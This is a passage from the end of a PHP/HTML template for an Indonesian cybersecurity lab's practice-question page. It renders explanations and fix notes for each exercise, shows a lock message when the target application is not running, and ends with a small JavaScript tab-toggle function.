            <p style="font-size:0.9em; line-height:1.7;"><?= $q['explanation'] ?></p>
        </div>

        <div id="fix-<?= $q['no'] ?>" class="soal-content">
            <h4>Cara Memperbaiki</h4>
            <p style="font-size:0.9em; line-height:1.7;"><?= $q['fix'] ?></p>
        </div>
    </div>
    <?php else: ?>
    <div class="soal soal-locked" id="soal-<?= $q['no'] ?>">
        <div class="soal-header">
            <span class="soal-no"><?= $q['no'] ?></span>
            <span class="soal-title" style="color:#555;"><?= $q['title'] ?></span>
            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : ($q['app'] === 'Fotorecv3' ? 'badge-foto' : 'badge-spmb') ?>"><?= $q['app'] ?></span>
            <span class="badge <?= str_replace(['Mudah', 'Sedang', 'Sulit'], ['badge-easy', 'badge-medium', 'badge-hard'], $q['level']) ?>"><?= $q['level'] ?></span>
        </div>
        <div class="soal-locked-msg">
            <span class="lock-icon">&#128274;</span>
            Aplikasi <strong><?= $q['app'] ?></strong> belum berjalan.
            <a href="/" style="color:#e94560;">Start aplikasi</a> terlebih dahulu melalui launcher untuk mengakses soal ini.
        </div>
    </div>
    <?php endif; ?>
    <?php endforeach; ?>

    <div class="footer">
        Lab Keamanan Siber &mdash; Soal Praktik<?= $filterApp ? " ($filterApp)" : '' ?> &mdash; <?= date('Y') ?>
    </div>
</div>

<script>
function toggle(id, btn) {
    const el = document.getElementById(id);
    const parent = el.parentElement;
    const buttons = parent.querySelectorAll('.togglers button');
    buttons.forEach(b => b.classList.remove('active'));
    parent.querySelectorAll('.soal-content').forEach(c => c.classList.remove('show'));
    el.classList.add('show');
    btn.classList.add('active');
}
</script>
</body>
</html>
